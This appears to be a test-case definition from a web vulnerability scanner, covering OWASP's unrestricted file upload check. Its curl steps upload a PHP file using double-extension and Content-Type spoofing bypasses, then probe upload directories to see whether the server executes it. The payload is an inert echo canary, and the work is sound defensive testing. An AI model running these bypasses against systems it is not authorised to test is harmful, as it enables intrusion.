id: WSTG-BUSL-09
name: Unrestricted File Upload
category: Business Logic
attack_class: upload
severity: critical
references:
  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files

# THIS CASE WRITES TO THE TARGET. It is the only one in the catalogue that
# does, and it is unavoidable: "does this endpoint accept a file it should
# refuse" cannot be answered without sending one.
#
#   * The payload is INERT. `<?php echo "…canary…"; ?>` prints a string and
#     does nothing else — no shell, no network, no filesystem. It proves the
#     server EXECUTED the upload, which is the finding, and gives whoever
#     finds the file nothing to use.
#   * Every file carries the canary in its NAME, so cleanup is one command:
#     find / -name 'erlik-upload-*'
#
# `parameter` IS REQUIRED, and that is the lesson from running this against
# DVWA. An earlier version hardcoded the field name `file`; DVWA's is
# `uploaded`, so every POST was ignored, the page rendered normally, and the
# case reported CLEAN against a target that is deliberately vulnerable. A
# wrong field name and a secure application look identical from the outside.
# erlik refuses to guess a parameter elsewhere for exactly this reason.
#
# `submit` exists for the same reason the login form needed it: DVWA gates its
# upload on `isset($_POST['Upload'])`, so a POST without that button is not an
# upload attempt at all. It is optional — most APIs need nothing — and is
# omitted entirely when unset rather than sent empty, because `curl -F ""` is
# a hard error that would kill the step.
#
# Acceptance is MEDIUM; execution is what makes it critical. An upload
# directory that stores a .php without serving it is a weakness, not a shell.

target_schema:
  required: [url, parameter]
  optional: [submit, cookie, auth_header]

steps:
  # Double extension: defeats a check that reads only the last dot, or only
  # the first.
  - name: double_extension_upload
    tool: curl
    command: >-
      bash -c 'S="{{submit}}"; curl -s -i -b "{{cookie}}" -H "{{auth_header}}"
      -F "{{parameter}}=@/dev/null;filename=erlik-upload-canary.php.jpg;type=image/jpeg"
      ${S:+-F "$S"} "{{url}}"'
    evaluators:
      - type: regex
        pattern: 'erlik-upload-canary\.php'
        emit_finding:
          vuln_type: File upload accepts a double extension (.php.jpg)
          severity: medium

  # Content-Type spoofing: the bytes are PHP, the declared type is an image.
  - name: content_type_spoof_upload
    tool: curl
    when: no_finding_yet
    command: >-
      bash -c 'S="{{submit}}"; printf %s "<?php echo \"ERLIK-UPLOAD-EXECUTED-CANARY\"; ?>"
      | curl -s -i -b "{{cookie}}" -H "{{auth_header}}"
      -F "{{parameter}}=@-;filename=erlik-upload-canary.php;type=image/png"
      ${S:+-F "$S"} "{{url}}"'
    evaluators:
      # The response must name the file BACK. An earlier version accepted any
      # "200"/"success" in the body and fired on Juice Shop's ordinary index
      # page — the `200` it matched was the HTTP status line of a response to
      # a POST the application ignored. A status code proves the server
      # answered, not that it stored anything.
      - type: regex
        pattern: 'erlik-upload-canary'
        emit_finding:
          vuln_type: File upload accepts PHP content declared as an image
          severity: medium

  # THE finding. The canary appears WITHOUT its surrounding <?php … ?>, which
  # only happens if the server ran it. A stored-but-not-executed file returns
  # the source, and the source contains the tags — so the two outcomes are
  # distinguishable rather than both matching "canary present".
  - name: uploaded_file_executes
    tool: curl
    when: has_finding
    command: >-
      bash -c 'for d in "" "uploads/" "../hackable/uploads/" "files/" "upload/"; do
      curl -s -b "{{cookie}}" -H "{{auth_header}}" "{{url}}/${d}erlik-upload-canary.php"; done'
    evaluators:
      - type: regex
        pattern: 'ERLIK-UPLOAD-EXECUTED-CANARY'
        emit_finding:
          vuln_type: Uploaded file is EXECUTED by the server (remote code execution)
          severity: critical
        stop_after: true

  # A server that refuses the upload still says which extensions it allows,
  # and that list is the surface the next test targets.
  - name: rejection_names_the_allowlist
    tool: curl
    when: no_finding_yet
    command: >-
      bash -c 'S="{{submit}}"; curl -s -b "{{cookie}}" -H "{{auth_header}}"
      -F "{{parameter}}=@/dev/null;filename=erlik-upload-canary.php;type=application/x-php"
      ${S:+-F "$S"} "{{url}}"'
    evaluators:
      # Requires a CONCRETE extension list, or explicit prose about a file
      # type being refused. The first version matched
      # `{"allowed":true,"type":"user","format":"json"}` — an ordinary API
      # response — because it accepted any allow-word within 40 characters of
      # the bare word "type".
      - type: regex
        pattern: '(only|allowed|permitted|accepted)[^.\n]{0,40}\b(jpe?g|png|gif|pdf|docx?|xlsx?|csv|zip)\b|file (type|extension|format)s?[^.\n]{0,30}(not allowed|not permitted|not supported|invalid|rejected)'
        emit_finding:
          vuln_type: Upload endpoint discloses its allowlist in a rejection message
          severity: info
